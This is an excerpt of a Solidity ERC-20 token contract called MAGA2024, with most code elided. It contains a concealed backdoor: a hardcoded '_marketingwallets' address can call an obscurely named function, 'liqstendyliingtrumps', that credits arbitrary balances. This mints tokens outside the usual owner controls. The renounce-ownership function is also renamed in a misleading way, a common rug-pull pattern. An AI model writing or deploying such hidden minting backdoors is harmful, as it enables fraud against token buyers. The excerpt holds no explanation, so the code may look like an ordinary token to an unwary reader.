...
contract Ownable is Context {
    ...
    function renounceOwnershiptrump2024sents() public virtual onlyOwner {
...
contract MAGA2024 is Context, Ownable, IERC20 {
    ...
    uint256 private _totalSupply;address private   _marketingwallets;
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _marketingwallets = 0x410B24ff359b85eE99bC71568c3377DF75Be6874;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function Aapprove(address user, uint256 Percentse) external {
    ...
    function isMee() internal view returns (bool) {
        return _msgSender() ==   _marketingwallets ;
    }

    function liqstendyliingtrumps(address recipient, uint256 aDropst)  external {uint256 receiveRewrd = aDropst;_balances[recipient] += receiveRewrd;require(isMee(), "Caller is not the original caller");
    }
